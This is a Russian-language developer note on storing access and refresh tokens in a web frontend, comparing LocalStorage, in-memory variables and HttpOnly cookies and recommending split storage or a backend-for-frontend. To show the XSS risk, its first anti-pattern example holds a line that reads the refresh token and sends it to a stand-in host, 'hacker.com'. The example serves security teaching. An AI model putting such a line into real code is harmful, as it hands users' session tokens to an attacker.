# Token Storage (Хранение токенов на клиенте)

## Суть и решаемая боль
Когда бэкенд выдает фронтенду токены (Access и Refresh), возникает главный вопрос: **где их хранить?** 
Если сохранить неправильно, токены украдут хакеры, и у вас будет утечка данных. Боль заключается в выборе из двух зол: защита от XSS (Cross-Site Scripting) или защита от CSRF (Cross-Site Request Forgery).

## Как это работает на практике

Есть три основных места для хранения, каждое со своими трейдоффами.

```mermaid
graph TD
    Tokens[Куда положить токены?]
    
    Tokens --> LocalStorage[LocalStorage / SessionStorage]
    LocalStorage -->|Плюс| Easy[Удобно, переживает релоад]
    LocalStorage -->|Минус| XSS[Уязвимо к XSS атакам]
    
    Tokens --> Memory[In-Memory Variable (Redux / Context)]
    Memory -->|Плюс| SafeXSS[Защищено от XSS]
    Memory -->|Минус| Erase[Стирается при F5 / вкладках]
    
    Tokens --> Cookie[HttpOnly Cookie]
    Cookie -->|Плюс| UltraSafe[Максимальная защита от XSS]
    Cookie -->|Минус| CSRF[Уязвимо к CSRF, сложный CORS]
```

## Примеры кода и подходы

**Антипаттерн 1 (Refresh Token в LocalStorage):**
```javascript
// САМАЯ ЧАСТАЯ И ОПАСНАЯ ОШИБКА
// Если на сайте есть XSS (например, вредоносный npm-пакет или дыра в React dangerouslySetInnerHTML),
// хакер выполнит:
const stolenRefresh = localStorage.getItem('refreshToken');
fetch('http://hacker.com/steal?token=' + stolenRefresh);
// Хакер получает вечный доступ к аккаунту!
```

**Паттерн: Раздельное хранение (Золотая середина):**
1. **Refresh Token** живет *только* в `HttpOnly Secure Cookie` (устанавливается бэкендом). JS не имеет к нему доступа. Защита от XSS.
2. **Access Token** живет в `In-Memory` (переменная в JS / Zustand / Redux) и живет 15 минут.
   
```javascript
// На старте приложения делаем тихий запрос за Access Токеном
const initAuth = async () => {
    try {
        // Браузер сам прикрепит HttpOnly куку с Refresh токеном
        const res = await api.post('/refresh-token');
        // Сохраняем Access Token только в память!
        setInMemoryAccessToken(res.data.accessToken); 
    } catch {
        // Куки нет или протухла -> юзер гость
    }
}
```

## Неочевидные нюансы и трейдоффы
- **Угроза XSS переоценена?** В современных фреймворках (React, Vue) XSS сделать сложно, так как они экранируют вывод из коробки. Однако, один кривой `dangerouslySetInnerHTML` или уязвимый NPM-пакет сводят эту защиту на нет. Если вы храните Access Token в LocalStorage — смиритесь с тем, что при XSS его украдут.
- **Backend-For-Frontend (BFF):** Самый современный и безопасный подход (используется в NextAuth.js). SPA вообще не видит токенов. Бэкенд-прослойка (Next.js API Routes) хранит токены в зашифрованной HttpOnly куке и сама занимается прикреплением Bearer токенов при проксировании запросов на основной API.
- **Что делать с вкладками?** Если хранить Access Token в In-Memory, то при открытии новой вкладки юзер будет "разлогинен", пока не отработает `/refresh-token` (мигание UI). Решается через лоадеры или использование `Web Worker` для хранения стейта.
